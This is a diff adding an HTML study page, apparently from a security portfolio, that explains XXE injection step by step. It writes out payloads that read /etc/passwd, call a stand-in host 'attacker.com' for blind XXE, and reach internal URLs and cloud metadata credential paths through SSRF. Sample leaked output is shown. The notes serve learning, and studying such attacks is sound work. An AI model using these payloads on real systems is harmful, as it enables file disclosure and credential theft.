@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XXE Notes</title>
+  <link rel="stylesheet" href="notes.css">
+</head>
+
+<body>
+
+<section>
+  <div class="card">
+
+<h4># XXE Injection</h4>
+
+<h4>Step 1 — Is XML present?</h4>
+
+<div class="code-box">
+<pre>
+Content-Type: application/xml
+
+OR
+
+&lt;?xml version="1.0"?&gt;
+</pre>
+</div>
+
+<h4>Step 2 — Inject DOCTYPE</h4>
+
+<div class="code-box">
+<pre>
+&lt;!DOCTYPE test [
+&lt;!ENTITY test "HELLO"&gt;
+]&gt;
+</pre>
+</div>
+
+<h4>Step 3 — Does the entity get displayed?</h4>
+
+<div class="code-box">
+<pre>
+&lt;data&gt;&amp;test;&lt;/data&gt;
+</pre>
+</div>
+
+<p>Response:</p>
+
+<div class="code-box">
+<pre>HELLO</pre>
+</div>
+
+<h4>Step 4 — Is there reflection?</h4>
+
+<p>Not all fields appear in the response.</p>
+
+<div class="code-box">
+<pre>
+&lt;username&gt;abc&lt;/username&gt;
+&lt;email&gt;xyz&lt;/email&gt;
+</pre>
+</div>
+
+<p>
+So each field has to be tested one by one.
+Maybe only the username is reflected.
+</p>
+
+<h4>Step 5 — External Entity test</h4>
+
+<div class="code-box">
+<pre>
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+</pre>
+</div>
+
+<h4>Step 6 — External URL test</h4>
+
+<div class="code-box">
+<pre>
+&lt;!ENTITY xxe SYSTEM "http://example.com"&gt;
+</pre>
+</div>
+
+<h4># XXE Successful Signs</h4>
+
+<div class="code-box">
+<pre>
+HELLO appears → Entity is parsed
+File content appears → In-band XXE
+External request goes out → Blind XXE
+Internal URL access → SSRF
+XML error → possible XXE
+</pre>
+</div>
+
+<h4># XXE Failed Signs</h4>
+
+<div class="code-box">
+<pre>
+DOCTYPE disallowed → blocked
+Unknown entity → disabled
+XML invalid → syntax error
+No reflection → maybe blind
+</pre>
+</div>
+
+<h4># Types of XXE</h4>
+
+<p>
+By observing the response and server behavior,
+we can determine the type of XXE
+</p>
+
+<h4>1. In-band XXE</h4>
+
+<p>The data is directly visible in the response.</p>
+
+<div class="code-box">
+<pre>
+&lt;!DOCTYPE test [
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+
+&lt;data&gt;
+  &lt;id&gt;&amp;xxe;&lt;/id&gt;
+&lt;/data&gt;
+</pre>
+</div>
+
+<h4>Response:</h4>
+
+<div class="code-box">
+<pre>
+root:x:0:0:root:/root:/bin/bash
+</pre>
+</div>
+
+<h4>2. Blind XXE</h4>
+
+<p>
+Nothing is visible in the response,
+BUT the server sends an external request.
+</p>
+
+<div class="code-box">
+<pre>
+&lt;!DOCTYPE test [
+&lt;!ENTITY xxe SYSTEM "http://attacker.com"&gt;
+]&gt;
+
+&lt;data&gt;
+  &lt;id&gt;&amp;xxe;&lt;/id&gt;
+&lt;/data&gt;
+</pre>
+</div>
+
+<h4>Response:</h4>
+
+<div class="code-box">
+<pre>
+Invalid request (no output)
+But attacker server receives request
+</pre>
+</div>
+
+<h4>3. SSRF via XXE</h4>
+
+<p>The server is fetching internal/external URLs.</p>
+
+<div class="code-box">
+<pre>
+&lt;!ENTITY xxe SYSTEM "http://127.0.0.1/admin"&gt;
+</pre>
+</div>
+
+<div class="code-box">
+<pre>
+/latest
+/meta-data
+/iam
+/security-credentials
+</pre>
+</div>
+
+<div class="code-box">
+<pre>
+The server sends an internal request.
+</pre>
+</div>
+
+<h4>Signs</h4>
+
+<div class="code-box">
+<pre>
+- Different response time
+- Different error
+- Internal data
+- URL interaction
+
+➡️ SSRF is occurring through XXE
+</pre>
+</div>
+
+<h4>4. Error-based XXE</h4>
+
+<div class="code-box">
+<pre>
+Error message leaks sensitive data
+
+example:
+
+XML parsing failed:
+root:x:0:0:root
+</pre>
+</div>
+
+<h4># Observation</h4>
+
+<div class="code-box">
+<pre>
+XXE Type              | Response & Behavior
+----------------------|-------------------------------
+In-band XXE          | File content appears in response
+Blind XXE            | No output, but external request is triggered
+SSRF via XXE         | Internal URLs can be accessed
+Error-based XXE      | Sensitive data leaks in error message
+</pre>
+</div>
+
+<br>
+
+<a href="../index.html">⬅ Back to Portfolio</a>
+
+  </div>
+</section>
+
+</body>
+</html>
